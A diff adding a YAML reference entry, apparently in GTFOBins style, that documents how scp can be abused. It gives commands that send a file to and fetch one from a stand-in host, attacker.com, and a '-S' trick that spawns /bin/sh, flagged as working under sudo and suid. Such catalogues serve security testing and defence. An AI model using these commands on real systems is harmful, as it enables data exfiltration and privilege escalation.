@@ -1,0 +1,29 @@
+---
+functions:
+  download:
+  - code: |-
+      scp user@attacker.com:/path/to/input-file /path/to/output-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: ssh-server
+  shell:
+  - code: |-
+      echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+      chmod +x /path/to/temp-file
+      scp -S /path/to/temp-file . x:
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  upload:
+  - code: |-
+      scp /path/to/input-file user@attacker.com:/path/to/output-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: ssh-server
+...
